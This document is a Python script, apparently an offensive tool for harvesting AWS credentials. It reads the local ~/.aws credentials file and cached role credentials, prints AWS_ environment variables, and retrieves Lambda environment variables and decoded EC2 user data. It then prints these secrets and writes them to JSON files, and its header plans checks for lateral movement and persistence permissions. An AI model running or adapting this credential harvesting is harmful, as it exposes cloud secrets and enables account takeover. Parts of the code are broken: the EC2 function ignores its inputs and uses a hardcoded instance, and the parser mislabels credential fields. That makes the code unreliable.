'''
Cloud Credentials Gathering

* Passive
    - credentials files
    - env vars
    - user data
    - from lambda env vars

* Active
    - Generate config file based on discovery
    - Enrich with caller identity (aws user, account_id)
    - Check lateral movement and persistance permissions
    - Session token restore?

python3 ignite --gather aws | credentials | role | lambda | user_data > json file with configs


'''
import os
import argparse
import json
import boto3
import base64
import subprocess
from pprint import pprint

def main():
    args = parse_args()
    if args.output:
        output_file = args.output
    else:
        output_file = 'burn_output_credentials_file.json'

    if args.subcommand == 'gather':
        if args.aws == 'credentials':
            get_aws_credentials_file(output_file)
            
        elif args.aws == 'role':
            get_aws_config_file()

        elif args.aws == 'env':
            get_aws_from_env()

    elif args.subcommand == 'who':
        if args.profile:
            who_data = who(args.profile)
            print(who_data)
            
    elif args.subcommand == 'retrieve':
        if args.lambda_envs:
            function_details = retrieve_lambda(args.lambda_envs, args.region, args.profile)
            # Print or process the function details as needed
            print("Lambda Function Details:")
            print("Function Name:", function_details['FunctionName'])
            print("Runtime:", function_details['Runtime'])
            print("Env Vars:", function_details['Environment']['Variables'])
        
        elif args.ec2_data:
            instance_info = get_user_data_ec2(args.profile, args.region, args.ec2_data)
            data = json.loads(instance_info.stdout)
            base64_string = data['UserData']['Value']
            # Decode the Base64 string
            decoded_bytes = base64.b64decode(base64_string)

            # Convert the decoded bytes to a string (if it contains text)
            decoded_string = decoded_bytes.decode('utf-8')

            # Print the decoded string
            print(decoded_string)




def get_aws_credentials_file(output_file):
    file_path = generate_file_path('credentials')
    try:
        with open(file_path, 'r') as file:
            file_content = file.read()
        parsed_content = parse_aws_credentials(file_content)
        write_dict_to_json(parsed_content, output_file)
        print(file_content)
        return file_content  

    except FileNotFoundError:
        print(f"File '{file_path}' not found.")
    except Exception as e:
        print(f"An error occurred: {e}")   


def get_aws_config_file():
    config_file = 'config'
    config_file_path = generate_file_path(config_file)

    try:
        with open(config_file_path, 'r') as conf_file:
            config_file_content = conf_file.read()

    except FileNotFoundError:
        return f"File '{config_file_path}' not found."
    except Exception as e:
        return f"An error occurred: {e}"
    
    cache_path = os.path.join('cli', 'cache')
    role_path = file_path = generate_file_path(cache_path)
    file_list = os.listdir(role_path)
    cache_file_list = []
    for cache_file in file_list:
        role__file_path = os.path.join(cache_path, cache_file)
        file_path = generate_file_path(role__file_path)

        with open(file_path, 'r') as file:
            file_content = file.read()

        credentials_file_content = json.loads(file_content)
        pprint(credentials_file_content['Credentials']) 
        
        output_file_name = cache_file
        
        write_dict_to_json(credentials_file_content['Credentials'], output_file_name)   
        print()

    with open("config", 'w') as config_file:
        config_file.write(config_file_content)   
        print(config_file_content)   


def get_aws_from_env():
    # Get a dictionary of all environment variables and their values
    env_vars = os.environ

    # Print the environment variables and their values
    for var, value in env_vars.items():
        if var.startswith('AWS_'):
            print(f"{var}: {value}")


def parse_aws_credentials(content):
    aws_credentials = []
    current_section = None

    lines = content.strip().split('\n')

    for line in lines:
        line = line.strip()
        if line.startswith("[") and line.endswith("]"):
            current_section = line[1:-1]
        elif current_section and "=" in line:
            key, value = line.split("=", 1)
            key = key.strip()
            value = value.strip()
            aws_credentials.append({"profile": current_section, "access_key": key, "secret_access_key": value})

    return aws_credentials


def generate_file_path(file):
    # Specify the user's home directory
    user_home = os.path.expanduser("~")

    # Define the relative path to the AWS CLI configuration file
    file_path = os.path.join(user_home, ".aws", f"{file}")

    return file_path


def who(profile_name):
    try:
        # Create a session using the specified profile
        session = boto3.Session(profile_name=profile_name)

        # Get information about the AWS identity
        sts_client = session.client('sts')
        identity_info = sts_client.get_caller_identity()

        return {
            "Account ID": identity_info['Account'],
            "User ARN": identity_info['Arn'],
            "User ID": identity_info['UserId']
        }
    except Exception as e:
        print(f"An error occurred: {e}")


def retrieve_lambda(function_name, region, profile):
    # Initialize the Lambda client
    aws_session  = boto3.Session(profile_name=profile, region_name=region)
    lambda_client = aws_session.client('lambda')
    try:
        # Describe the Lambda function
        response = lambda_client.get_function(FunctionName=function_name)
        
        # Access the detailed information from the response
        function_details = response['Configuration']
        return function_details

    except Exception as e:
        print(f"An error occurred: {e}")


def get_user_data_ec2(profile, region, instance_id):
    '''
    aws ec2 describe-instance-attribute --instance-id i-08354e239a8268780 --attribute userData --region sa-east-1 --profile demo-env
    '''
    command = 'aws ec2 describe-instance-attribute --instance-id i-08354e239a8268780 --attribute userData --region sa-east-1 --profile demo-env'

    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    return result


def parse_args():
    parser = argparse.ArgumentParser(description="")
    
    burn_parser = parser.add_subparsers(dest="subcommand", help="Subcommands")

    burn_parser.required = False

    gather_cmd = burn_parser.add_parser('gather', help='')
    gather_cmd.add_argument("--aws", choices=["credentials", "role", "metadata", "env", "all"], help="Gather AWS information")
    gather_cmd.add_argument("--output", "-o", help="Gather AWS information")

    who_cmd = burn_parser.add_parser('who', help='')
    who_cmd.add_argument("--profile", help="Gather AWS information")
    who_cmd.add_argument("--output", "-o", help="Gather AWS information")

    retrieve_cmd = burn_parser.add_parser('retrieve', help='')
    retrieve_cmd.add_argument("--output", "-o", help="Gather AWS information")
    retrieve_cmd.add_argument("--lambda-envs", help="Gather AWS information")
    retrieve_cmd.add_argument("--ec2-data", help="Gather AWS information")
    retrieve_cmd.add_argument("--profile", help="Gather AWS information")
    retrieve_cmd.add_argument("--region", help="Gather AWS information")

    args = parser.parse_args()
    return args


def write_dict_to_json(data_dict, output_file_path):
    with open(output_file_path, 'w') as json_file:
        json.dump(data_dict, json_file, indent=4) 


if __name__ == '__main__':
     main()